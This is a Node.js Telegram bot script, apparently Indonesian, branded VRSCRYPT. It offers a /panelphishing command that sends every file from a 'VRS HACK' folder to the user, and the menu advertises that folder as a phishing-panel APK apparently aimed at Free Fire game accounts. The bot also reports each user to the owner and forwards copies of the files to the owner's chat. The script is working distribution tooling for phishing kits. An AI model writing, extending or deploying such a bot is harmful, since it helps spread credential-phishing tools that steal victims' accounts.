const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const config = require('./config.json');

const bot = new TelegramBot(config.bot_token, {polling: true});

// Format menu keren
function createMenu(title, items) {
  let menu = `╭━〔 ${title} 〕━⪧\n`;
  items.forEach(item => menu += `┃ ⪧ ${item}\n`);
  return menu + '╰━━━━━━━━━━━━━━━⪧';
}

bot.onText(/\/start/, (msg) => {
  const response = [
    "╭━〔 👋  VRS 〕━⪧",
    "┃ Welcome To Script VRSCRYPT",
    "┃ Script Ini Khusus Untuk Mengetahui Tentang",
    "┃ VRSCRYPT",
    "┃ Dan Untuk Akses Reseller / Owner",
    "╰━━━━━━━━━━━━━━━⪧",
    "",
    createMenu('📄 Informasi Bot', [
      'Bot Name: VRSCRYPT',
      'Version: 2.0',
      'Developer: VRS'
    ]),
    "",
    createMenu('⚠️ Fitur Gelo', [
      '/panelphishing - APK Phishing Panel FF',
      'Lokasi: /storage/emulated/0/VRS HACK/',
      'File otomatis dikirim ke bot!'
    ])
  ].join('\n');

  bot.sendMessage(msg.chat.id, response);
});

bot.onText(/\/panelphishing/, async (msg) => {
  const chatId = msg.chat.id;
  
  try {
    const files = fs.readdirSync(config.storage_path);
    
    if (files.length === 0) {
      return bot.sendMessage(chatId, "❌ Folder VRS HACK kosong!");
    }

    bot.sendMessage(chatId, "📂 Mengirim file...");
    
    // Kirim ke owner juga
    if (chatId.toString() !== config.owner_id) {
      const user = await bot.getChat(chatId);
      const username = user.username || user.first_name;
      bot.sendMessage(config.owner_id, `🚀 ${username} mengakses panelphishing`);
    }

    for (const file of files) {
      const filePath = path.join(config.storage_path, file);
      await bot.sendDocument(chatId, filePath);
      
      if (chatId.toString() !== config.owner_id) {
        await bot.sendDocument(config.owner_id, filePath);
      }
    }

  } catch (error) {
    bot.sendMessage(chatId, "❌ Gagal mengakses folder!");
    console.error(error);
  }
});

console.log('🤖 Bot VRSCRYPT aktif!');
